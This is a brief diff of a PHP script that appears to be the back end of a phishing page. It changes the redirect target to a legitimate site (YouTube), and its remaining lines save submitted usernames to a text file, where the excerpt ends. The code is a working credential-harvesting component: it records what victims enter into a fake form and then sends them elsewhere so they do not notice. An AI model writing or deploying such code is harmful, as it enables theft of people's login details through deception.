@@ -1,5 +1,5 @@
 <?php
-header("Location: forwarding_url");
+header("Location: https://www.youtube.com");
 
 if (!empty($_POST['username'])) {
 file_put_contents("usernames.txt", " "  . $_POST['username'] . "\n", FILE_APPEND);
